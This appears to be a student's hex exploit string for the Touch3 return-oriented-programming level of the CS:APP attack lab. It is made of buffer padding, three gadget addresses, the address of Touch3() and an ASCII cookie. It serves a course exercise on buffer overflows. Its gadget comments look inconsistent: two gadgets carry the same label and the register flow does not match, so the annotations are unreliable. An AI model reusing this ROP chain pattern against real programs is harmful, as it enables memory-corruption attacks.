00 00 00 00 00 00 00 00 00 00 /* buffer space */
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
89 1a 40 00 00 00 00 00       /* gadget 1: mov %rsp, %rbx */
b7 19 40 00 00 00 00 00       /* gadget 2: mov %rax, %rdi */
83 19 40 00 00 00 00 00       /* gadget 3: mov %rax, %rdi */
ec 18 40 00 00 00 00 00       /* location of Touch3() */
00 00 00 00 00 00 00 00 00 00 /* buffer range */
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00
37 36 63 34 34 32 32 32 00 /* Cookie */
